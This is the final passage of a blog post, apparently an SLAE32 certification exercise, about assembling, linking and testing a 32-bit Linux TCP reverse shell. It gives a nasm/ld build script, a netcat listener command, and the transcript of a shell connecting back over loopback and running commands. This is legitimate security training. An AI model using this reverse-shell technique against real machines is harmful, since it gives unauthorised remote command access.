+<li>Assembling: can happen with the <code>nasm</code> assembler, which assembles the input file (<code>.nasm</code>) and directs output to the output file (<code>.o</code>) if specified. It basically &ldquo;translates&rdquo; the <code>Assembly</code> code.</li>
+<li>Linking: can happen with the GNU linker <code>ld</code>, which combines a number of object and archive files, relocates their data and ties up symbol references. It basically provides information such as where the entry point of a program is. By default the entry point is <code>_start</code> but this can be changed.</li>
+</ul>
+<p>The following <code>bash</code> script automates that process:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
+</span><span style=color:#75715e></span>
+echo <span style=color:#e6db74>&#39;[+] Assembling with Nasm ... &#39;</span>
+nasm -felf32 -o $1.o $1.nasm
+
+echo <span style=color:#e6db74>&#39;[+] Linking ...&#39;</span>
+ld -o $1 $1.o
+
+echo <span style=color:#e6db74>&#39;[+] Done!&#39;</span>
+</code></pre></div><p>The following command does the compilation and creates the executable <code>reverse</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./compile.sh reverse
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Assembling with Nasm ... 
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Linking ...
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Done!
+</code></pre></div><p>We test the Reverse Shell by creating a listener on port <code>4444</code> with <code>nc</code> in one terminal window and in another we execute the executable <code>reverse</code>. Then, back to the first we verify the incoming connection and run the commands <code>id</code> and <code>ls</code>.</p>
+<p>1<sup>st</sup> window:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ nc -lvnp <span style=color:#ae81ff>4444</span>
+</code></pre></div><p>2<sup>nd</sup> window:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse
+
+</code></pre></div><p>1<sup>st</sup> window again:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>Listening on <span style=color:#f92672>[</span>0.0.0.0<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>family 0, port 4444<span style=color:#f92672>)</span>
+Connection from <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>]</span> port <span style=color:#ae81ff>4444</span> <span style=color:#f92672>[</span>tcp/*<span style=color:#f92672>]</span> accepted <span style=color:#f92672>(</span>family 2, sport 35306<span style=color:#f92672>)</span>
+id
+uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>geobour98<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>geobour98<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>geobour98<span style=color:#f92672>)</span>,4<span style=color:#f92672>(</span>adm<span style=color:#f92672>)</span>,24<span style=color:#f92672>(</span>cdrom<span style=color:#f92672>)</span>,27<span style=color:#f92672>(</span>sudo<span style=color:#f92672>)</span>,30<span style=color:#f92672>(</span>dip<span style=color:#f92672>)</span>,46<span style=color:#f92672>(</span>plugdev<span style=color:#f92672>)</span>,113<span style=color:#f92672>(</span>lpadmin<span style=color:#f92672>)</span>,128<span style=color:#f92672>(</span>sambashare<span style=color:#f92672>)</span>
+ls
+compile.sh
+reverse
+reverse-c
+reverse-c.c
+reverse.nasm
+reverse.o
+reverse.py
+exit
+geobour98@slae32-dev:~$
+</code></pre></div><h2 id=summary>Summary<a hidden class=anchor aria-hidden=true href=#summary>#</a></h2>
+<p>We have a working TCP Reverse Shell that connects to loopback interface on port 4444 on our machine and we can execute commands after connecting.</p>
+<p>Next will be the Egg Hunter shellcode!</p>
+<div class="notice note">
+<p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#note-notice"/></svg></span>Note</p><h3 id=slae32-blog-post>SLAE32 Blog Post<a hidden class=anchor aria-hidden=true href=#slae32-blog-post>#</a></h3>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Aseembly Expert certification:</p>
+<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
+<p><del><a href=http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></del></p>
+<p><strong>Student ID: PA-36167</strong></p></div>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://geobour98.github.io/tags/slae32/>slae32</a></li>
+<li><a href=https://geobour98.github.io/tags/assembly/>assembly</a></li>
+<li><a href=https://geobour98.github.io/tags/shellcode/>shellcode</a></li>
+<li><a href=https://geobour98.github.io/tags/exploit-development/>exploit-development</a></li>
+</ul>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2023 <a href=https://geobour98.github.io/>geobour98</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerHTML='copy';function d(){a.innerHTML='copied!',setTimeout(()=>{a.innerHTML='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
